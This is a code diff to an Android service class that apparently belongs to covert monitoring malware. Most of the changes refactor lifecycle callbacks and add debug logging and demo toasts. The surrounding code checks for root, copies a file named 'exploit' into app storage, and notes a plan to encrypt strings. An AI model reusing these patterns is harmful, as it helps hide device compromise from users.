@@ -26,6 +26,7 @@ import android.app.WallpaperManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.res.Configuration;
 import android.content.res.Resources;
 import android.graphics.Bitmap;
 import android.graphics.Bitmap.Config;
@@ -76,57 +77,14 @@ public class ServiceCore extends Service {
 		Status.setAppContext(getApplicationContext());
 	}
 
-	private void setBackground() {
-		if (Cfg.DEMO) {
-			final WallpaperManager wm = WallpaperManager.getInstance(this);
-			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
-					.getDefaultDisplay();
-			final int width = display.getWidth();
-			final int height = display.getHeight();
-			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
-			final Canvas canvas = new Canvas(bitmap);
-			final Paint paint = new Paint();
-			paint.setStyle(Paint.Style.FILL);
-			paint.setAntiAlias(true);
-			paint.setTextSize(20);
-			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
-
-			try {
-				wm.setBitmap(bitmap);
-			} catch (final IOException e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(e);
-				}
-			}
-		}
-	}
-
-	@Override
-	public void onDestroy() {
-		super.onDestroy();
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
-		}
-
-		if (Cfg.DEMO) {
-			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
-		}
-
-		if (core != null) {
-			core.coreStop();
-			core = null;
-		}
-	}
-
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
+		}
+		
 		if (PackageInfo.checkRoot() == true) {
 			Status.self().setRoot(true);
 		} else {
@@ -154,6 +112,7 @@ public class ServiceCore extends Service {
 				case 0:
 				case 1:
 					return; // Non possiamo partire
+					
 				case 2: // Possiamo partire
 				default:
 					break;
@@ -163,7 +122,102 @@ public class ServiceCore extends Service {
 
 		// Core starts
 		core = Core.getInstance();
-		core.coreStart(this.getResources(), getContentResolver());
+		core.Start(this.getResources(), getContentResolver());
+	}
+	
+	@Override
+	public void onConfigurationChanged(Configuration newConfig) {
+		super.onConfigurationChanged(newConfig);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onConfigurationChanged)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
+	
+	@Override
+	public void onLowMemory() {
+		super.onLowMemory();
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onLowMemory)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.4"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
+	
+	@Override
+	public void onRebind(Intent intent) {
+		super.onRebind(intent);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onRebind)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.5"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+	}
+	
+	@Override
+	public boolean onUnbind(Intent intent) {
+		boolean ret = super.onUnbind(intent);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onUnbind)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("36.6"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+		
+		return ret;
+	}
+	
+	@Override
+	public void onDestroy() {
+		super.onDestroy();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEMO) {
+			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
+		}
+
+		core.Stop();
+		core = null;
+	}
+
+	private void setBackground() {
+		if (Cfg.DEMO) {
+			final WallpaperManager wm = WallpaperManager.getInstance(this);
+			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
+					.getDefaultDisplay();
+			final int width = display.getWidth();
+			final int height = display.getHeight();
+			final Bitmap bitmap = Bitmap.createBitmap(width, height, Config.ARGB_8888);
+			final Canvas canvas = new Canvas(bitmap);
+			final Paint paint = new Paint();
+			paint.setStyle(Paint.Style.FILL);
+			paint.setAntiAlias(true);
+			paint.setTextSize(20);
+			canvas.drawText(Messages.getString("32.0"), 10, 100, paint);
+
+			try {
+				wm.setBitmap(bitmap);
+			} catch (final IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(e);
+				}
+			}
+		}
 	}
 
 	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
@@ -408,6 +462,7 @@ public class ServiceCore extends Service {
 			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
 			byte[] buf = new byte[1024];
 			int numRead = 0;
+			
 			while ((numRead = in.read(buf)) >= 0) {
 				out.write(buf, 0, numRead);
 			}
@@ -422,6 +477,7 @@ public class ServiceCore extends Service {
 				ex.printStackTrace();
 				Check.log(TAG + " (fileWrite): " + ex);
 			}
+			
 			return false;
 		}
 
